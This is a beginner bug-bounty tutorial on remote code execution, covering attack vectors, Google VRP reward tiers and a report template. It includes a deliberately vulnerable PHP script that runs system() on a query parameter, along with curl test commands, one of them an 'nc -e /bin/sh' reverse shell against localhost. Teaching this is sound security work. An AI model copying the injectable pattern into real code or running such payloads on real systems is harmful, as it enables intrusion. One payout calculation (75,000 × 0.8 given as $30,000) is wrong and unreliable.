---
title: "What Is RCE: Remote Code Execution Vulnerabilities & Bug Bounty Rewards"
date: 2026-10-15
category: tech
type: guide
difficulty: beginner
tags: [bug-bounty, security, web-security, rce, remote-code-execution, vulnerability]
lang: en
description: "Series 5: Remote Code Execution (RCE) vulnerability principles, attack vectors, bounty reward structures (especially Google VRP), and how to test & report in a local environment."
tldr: "RCE lets attackers execute arbitrary code on the target server. Google VRP tops at $121,212 (T0/S0 + 1.2x). This article explains RCE basics, common vectors (command injection, unsafe deserialization, file upload), and provides test steps & report template."
draft: false
series:
  name: "Bug Bounty from Zero"
  order: 5
---

> 🌏 [Chinese version](/posts/tech/2026-10-15-bug-bounty-zero-05-what-is-rce)

## TL;DR

**RCE (Remote Code Execution) lets attackers run arbitrary code on the target server.** In bug bounty, RCE is common and high‑rewarding. Google VRP tops at $121,212 (T0/S0 + 1.2x quality multiplier). Vectors include command injection, unsafe deserialization, file upload. This article provides test steps in a local environment and a report template.

---

## Scenario

You’ve completed Articles 1‑4 and now want to tackle a deeper bug: RCE. Testing directly on real targets is risky and may violate program rules. You need a safe environment on your laptop to understand how RCE works, how to reproduce it, and how to write a report that earns the maximum reward.

---

## Problem

**Mistake 1:** Assuming RCE must be a complex zero‑day. Many RCE bugs come from simple coding errors: unsanitized user input passed to `system()`, `exec()`, `eval()`, or deserialization functions.

**Mistake 2:** No local test environment. You can’t simulate “executing a command on the server” on your laptop without a safe sandbox.

**Mistake 3:** Writing “I found RCE” without a reproducible PoC, impact analysis, or remediation advice. Google VRP drops the reward from $101,010 to $80,808 (0.8x) if the report lacks quality.

---

## Solution: RCE fundamentals + local test environment

### RCE Attack Vectors

| Vector | Common Functions | Key Defenses |
|---|---|---|
| **Command injection** | `system()`, `exec()`, `shell_exec()`, `passthru()`, backticks `` ` `` | Never use unsanitized user input as command arguments; use allow‑lists or parameterized APIs |
| **Unsafe deserialization** | `unserialize()` (PHP), `pickle.loads()` (Python), `ObjectInputStream.readObject()` (Java) | Avoid deserializing untrusted data; use signatures or class restrictions |
| **File upload** | Any language that executes uploaded scripts | Check file extension & MIME type; store uploads in non‑executable directories |
| **Template injection** | `eval()`, `render()`, `template.render()` | Never pass user input directly to a template engine |
| **Prototype pollution** (JS) | `__proto__`, `constructor.prototype` | Freeze object prototypes or use `Map` instead of plain objects |

### Local test server (PHP example)

The following minimal PHP server (`vuln.php`) simulates a command‑injection flaw. It binds only to `127.0.0.1`, so nothing is exposed externally.

```php
<?php
// vuln.php — safe for local practice only
if (isset($_GET['cmd'])) {
    echo "<pre>";
    // Dangerous: directly executes user input
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo 'Usage: ?cmd=ls or ?cmd=whoami';
}
?>
```

**Start it**: `php -S 127.0.0.1:8000 vuln.php`

**Test steps**:
1. Normal request: `curl 'http://127.0.0.1:8000/vuln.php?cmd=ls'`
2. Exec whoami: `curl 'http://127.0.0.1:8000/vuln.php?cmd=id'`
3. Reverse shell (controlled env only): `curl 'http://127.0.0.1:8000/vuln.php?cmd=nc -e /bin/sh 127.0.0.1 4444'`

> **⚠️ Warning**: This example is for education only. Run it in a completely isolated environment (e.g., a VM) and never test against targets you do not own or have permission to test.

### Report template for RCE

| Section | What to include |
|---|---|
| **Title** | `[Domain] RCE – arbitrary code execution` |
| **Summary** | One sentence on impact & severity |
| **Steps to Reproduce** | 1. `curl 'http://127.0.0.1:8000/vuln.php?cmd=id'` 2. Observe output |
| **Expected Behaviour** | System command output should not be displayed (if fixed) |
| **Actual Behaviour** | Command output appears in the response |
| **Impact** | Attacker can run any command as the web‑server user (e.g., `www‑data`), read files, install backdoors |
| **Proof of Concept** | The `curl` command above, plus sample output |
| **Severity / CVSS** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Remediation / Fix** | Replace `system($_GET['cmd'])` with a safe API; validate & whitelist inputs |
| **References** | OWASP Command Injection, Google VRP rules |

**Quality multiplier**: Add the four conditions for 1.2x (PoC, impact, CVSS, remediation) and your $101,010 reward may rise to $121,212.

---

## Why It Matters: The VRP Reward Architecture

| Tier | Domain | Base RCE payout | Max with 1.2x |
|---|---|---|---|
| **T0** | Tier 0 domains (e.g., `*.google.com`) | $101,010 | $121,212 |
| **T1** | Tier 1 domains | $101,010 | $121,212 |
| **T2** | Normal Google apps | $75,000 | $90,000 |
| **T3a** | Acquisition Tier 0/1 | $10,000 | $12,000 |
| **T3b** | Other acquisitions | $1,337–$5,000 | $1,604–$6,000 |

**Key takeaway**: The *same* vulnerability earns different amounts depending on the domain tier *and* report quality. A T0/S0 RCE with an exceptional report can fetch $121,212; a T2 RCE with a low‑quality report may only earn $30,000 (75,000 × 0.8x).

---

## Self‑Check (Key question: Do you get it?)

- [ ] You can name three common RCE attack vectors.
- [ ] You know how to test a simple command‑injection flaw on `127.0.0.1:8000`.
- [ ] You understand Google’s T0/S0 RCE base payout ($101,010) and maximum ($121,212).
- [ ] You know the four conditions for the 1.2x quality multiplier.
- [ ] You have written a reproducible PoC (e.g., the `curl` command above).

---

## References

- [Google VRP Rules](https://bughunters.google.com/about/rules/google-friends/google-and-alphabet-vulnerability-reward-program-vrp-rules)
- [Google VRP July 2024 Announcement](https://bughunters.google.com/blog/increasing-google-alphabet-vrp-rewards-up-to-151515)
- [Google 2024 In Review](https://blog.google/security/vulnerability-reward-program-2024-in/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [PortSwigger — Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PHP security: system() and exec()](https://php.net/manual/en/function.system.php)

---

*This is Series 5 (RCE) of “Bug Bounty from Zero.” Previous: Workbench (3), XSS/IDOR (4); Next: Report & Triage (6).*